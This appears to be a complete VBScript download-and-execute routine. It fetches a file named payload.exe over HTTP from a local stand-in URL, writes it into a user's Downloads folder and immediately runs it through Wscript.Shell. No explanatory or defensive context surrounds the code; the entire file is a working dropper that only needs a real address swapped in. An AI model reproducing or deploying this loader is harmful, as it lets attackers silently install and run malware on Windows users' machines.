Sub HTTPDownload(MyURL, FilePath)
    Dim objFSO, objFile, objHTTP, WSShell, i

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.OpenTextFile(FilePath, 2, True)
    Set objHTTP = CreateObject("WinHTTP.WinHTTPRequest.5.1")
    Set WSShell = CreateObject("Wscript.Shell")

    objHTTP.Open "GET", MyURL, False
    objHTTP.Send

    For i=1 To LenB(objHTTP.ResponseBody)
        objFile.Write(Chr(AscB(MidB(objHTTP.ResponseBody, i, 1))))
    Next
    objFile.Close

    WSShell.Run FilePath
End Sub

HTTPDownload "http://localhost/payload.exe", "C:\Users\johndoe\Downloads\payload.exe"
